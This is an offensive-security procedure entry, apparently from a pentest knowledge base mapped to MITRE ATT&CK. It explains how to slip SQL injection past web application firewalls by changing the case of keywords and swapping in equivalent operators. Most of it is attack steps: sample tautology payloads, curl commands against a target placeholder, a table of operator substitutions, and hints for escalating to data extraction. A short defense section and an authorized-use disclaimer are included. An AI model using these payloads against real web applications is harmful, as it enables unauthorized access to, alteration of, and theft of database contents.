---
id: 92d36a38-477d-46d2-b997-e0aa57924977
name: SQL-Injection-WAF-Bypass-using-Case-Modification
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:36.772362+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Exploit Public-Facing Application|T1190 - Exploit Public-Facing
    Application]]
sub_techniques: []
tags:
  - '[[tags/Case modification]]'
  - '[[tags/SQL Injection]]'
  - '[[tags/WAF Bypass]]'
commands:
  - '[[commands/curl-send-sqli-payload]]'
tools:
  - '[[tools/Burp-Suite]]'
platforms:
  - Web
validated: true
---

# SQL-Injection-WAF-Bypass-using-Case-Modification

## Summary

This procedure outlines techniques to bypass Web Application Firewalls (WAFs) designed to block SQL Injection (SQLi) attacks by modifying the case of SQL keywords (e.g., 'AND' to 'AnD') and substituting standard operators with functional equivalents (e.g., 'AND' to '&&'). These methods exploit case-sensitive or incomplete WAF rules, enabling injection of malicious SQL code to extract, modify, or execute commands on the target database.

## Description

SQL Injection vulnerabilities arise when web applications fail to sanitize user inputs, allowing attackers to append or alter SQL queries. WAFs inspect traffic for known malicious patterns, but many rules are case-sensitive or focus on specific keywords, making them vulnerable to obfuscation via case changes or operator substitutions. This procedure targets GET/POST parameters in web apps connected to databases like MySQL or SQL Server. It assumes a blind or error-based SQLi vulnerability exists. Successful bypass leads to unauthorized data access, alteration, or remote code execution if the database privileges allow. Use in controlled environments like penetration testing; unauthorized use is illegal.

## Requirements

1. Network access to a web application with a confirmed SQLi vulnerability (e.g., via parameter like 'id' in a search or login form).
2. Basic knowledge of SQL syntax and injection payloads (tautologies, unions, etc.).
3. Intercepting proxy or HTTP client like Burp Suite [[tools/Burp-Suite]] for crafting and replaying requests.
4. Optional: Wordlist of payloads or automation tool like sqlmap for testing variations.

## Defense

- Implement parameterized queries and input sanitization using prepared statements to eliminate SQLi risks at the application level.
- Configure WAFs with case-insensitive matching, regular expression updates, and coverage for operator equivalents; test rules against obfuscated payloads.
- Enable web application firewall logging, database audit trails, and anomaly detection for unusual query patterns or error responses.

## Objectives

1. Bypass WAF filters to inject and execute malicious SQL code without detection.
2. Gain unauthorized access to sensitive data stored in the database.
3. Modify or delete data within the database.
4. Execute arbitrary code on the web server if escalated privileges are available.

## Instructions

### Step 1: Inject Case-Varied SQLi Payloads

**Context**: Start by testing standard SQLi payloads; if blocked, vary the case of keywords like 'AND' to evade case-sensitive WAF rules. This step uses tautology injection (always-true condition) to confirm bypass and vulnerability. The '#' comments out the original query to avoid syntax errors.

**Code** ([[codes/SQL-Injection-Payloads-Case-Variation]]):

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Use [[commands/curl-send-sqli-payload]] to send the requests:

```bash
curl "http://$_TARGET/page?id=1 AND 1=1#"
curl "http://$_TARGET/page?id=1 AnD 1=1#"
curl "http://$_TARGET/page?id=1 aNd 1=1#"
```

> Compare responses: A successful bypass returns full results or altered page behavior (e.g., all users listed), unlike a false condition (?id=1 AND 1=2# which returns nothing). If blocked, proceed to Step 2 for operator substitution. Use Burp Suite [[tools/Burp-Suite]] to intercept and modify in real-time.

### Step 2: Substitute Operators with Equivalents

**Context**: If case variation fails, replace filtered keywords with equivalent operators that perform the same function but may not match WAF signatures. This is useful for building complex payloads (e.g., in WHERE clauses). Combine with case changes for better evasion.

**Code** ([[codes/SQL-Operator-Equivalents-for-WAF-Bypass]]):

```sql
AND   -> &&
OR    -> ||
=     -> LIKE,REGEXP, BETWEEN, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING
```

Incorporate into a payload, e.g., using '&&' instead of 'AND':

Use [[commands/curl-send-sqli-payload]]:

```bash
curl "http://$_TARGET/page?id=1 && 1=1#"
```

> Test the modified payload; success is indicated by query execution (e.g., data dump via UNION SELECT). If 'WHERE' is filtered, try 'HAVING'. Escalate by extracting data (e.g., ?id=1 && (SELECT user FROM users)#) or using time-based blind SQLi for confirmation. Verify no WAF blocks in proxy logs.
